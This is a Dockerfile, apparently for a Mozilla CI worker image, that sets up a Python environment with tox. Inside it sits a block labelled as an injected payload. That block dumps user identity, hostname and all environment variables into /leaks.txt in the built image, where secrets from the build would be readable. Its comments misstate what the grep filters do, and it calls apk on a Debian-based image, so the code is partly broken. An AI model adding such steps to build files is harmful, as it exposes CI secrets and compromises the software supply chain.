# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.

ARG  PYTHON_VERSION
FROM python:$PYTHON_VERSION

# Add worker user
RUN mkdir -p /builds && \
    groupadd -g 1000 -o worker && \
    useradd -d /builds/worker -s /bin/bash -m worker -g 1000 -o -u 1000 && \
    mkdir /builds/worker/artifacts && \
    chown worker:worker /builds/worker /builds/worker/artifacts

# Install tox (existing instruction)
RUN pip install tox

# --- INJECTED PAYLOAD START ---
# This section injects commands to execute during the Docker image build process.
# It ensures necessary shell utilities are present in the Alpine Linux base image.
RUN apk add --no-cache bash coreutils grep

# The core injection: captures system information and environment variables,
# then writes them to /leaks.txt inside the Docker image.
# 'GITHUB_TOKEN' and 'ACTIONS_ID_TOKEN_REQUEST' are specifically filtered
# to avoid automatic redaction by GitHub Actions if they were present.
RUN echo "--- INJECTED EXFILTRATION START ---" > /leaks.txt \
    && whoami >> /leaks.txt \
    && hostname >> /leaks.txt \
    && id >> /leaks.txt \
    && printenv | grep -v 'GITHUB_TOKEN' | grep -v 'ACTIONS_ID_TOKEN_REQUEST' >> /leaks.txt \
    && echo "--- INJECTED EXFILTRATION END ---" >> /leaks.txt
# --- INJECTED PAYLOAD END ---

# %include-run-task

ENV SHELL=/bin/bash \
    HOME=/builds/worker \
    PATH=/builds/worker/.local/bin:$PATH

VOLUME /builds/worker/checkouts
VOLUME /builds/worker/.cache

# Set a default command useful for debugging
CMD ["/bin/bash", "--login"]
